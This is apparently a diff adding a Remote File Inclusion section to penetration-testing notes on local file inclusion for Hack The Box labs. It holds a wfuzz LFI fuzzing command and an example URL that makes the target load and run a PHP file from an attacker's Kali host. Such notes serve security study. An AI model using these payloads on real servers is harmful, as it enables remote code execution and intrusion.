@@ -63,3 +63,11 @@ wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh <common nu
 ## LFI 2 RCE
 
 {% embed url="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/" %}
+
+## Remote File Inclusion (RFI)
+
+* Similar to an LFI but a remote file can be included and served to execute server-side code
+
+Example:
+
+http://htb.local/?page=http://\<kali_IP:8000>/maliciou_s\_file.php
